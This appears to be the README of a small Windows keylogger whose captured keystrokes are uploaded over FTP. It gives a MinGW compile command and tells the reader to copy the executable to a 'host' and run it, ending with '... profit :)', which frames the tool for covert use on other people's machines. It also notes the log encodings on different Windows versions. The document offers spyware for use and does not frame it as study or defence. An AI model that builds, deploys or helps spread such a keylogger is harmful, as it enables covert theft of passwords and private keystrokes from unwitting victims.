### About

A tiny keylogger with ftp upload

### Usage
* configure `keylogger.h` header
* compile (*with MinGW*):
```
gcc.exe keylogger.c -lwsock32 -o <name.exe> -s -Os
```
* copy <name.exe> to host
* run it and ... profit **:)**

### Note
* from **WinXP** log coming in *CP1251* encoding
* from **Win7-Win8** in *UTF-16LE*
